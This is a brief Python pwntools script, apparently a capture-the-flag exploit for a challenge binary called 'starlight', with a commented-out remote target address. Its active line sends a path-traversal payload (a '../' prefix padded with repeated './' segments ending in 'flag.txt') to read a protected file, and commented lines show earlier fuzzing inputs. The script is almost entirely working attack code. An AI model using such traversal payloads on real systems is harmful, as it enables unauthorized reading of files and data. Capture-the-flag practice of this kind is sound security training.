from pwn import *

def main():
	# for i in range(550):
	r = process("./starlight")
	#r = remote("203.34.119.237",11337)
	r.sendlineafter(":","../"+("./" * 53)+"flag.txt")
	# r.sendlineafter(":","3")
	# print str(i)
	# #r.sendlineafter(":","\\x0"+("A"*i )+ "\x00")
	# r.sendlineafter(":","A")
	r.interactive()
	r.close()

if __name__ == '__main__':
	main()